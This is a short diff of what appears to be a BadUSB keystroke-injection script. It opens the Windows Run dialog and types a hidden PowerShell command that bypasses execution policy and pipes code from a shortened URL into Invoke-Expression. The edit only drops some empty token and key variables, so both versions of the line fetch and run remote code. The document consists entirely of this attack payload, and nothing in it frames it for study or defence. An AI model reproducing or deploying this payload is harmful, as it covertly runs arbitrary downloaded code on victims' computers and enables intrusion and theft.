@@ -20,5 +20,5 @@ REM
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/wBFLV | iex
+STRING powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/wBFLV | iex
 ENTER
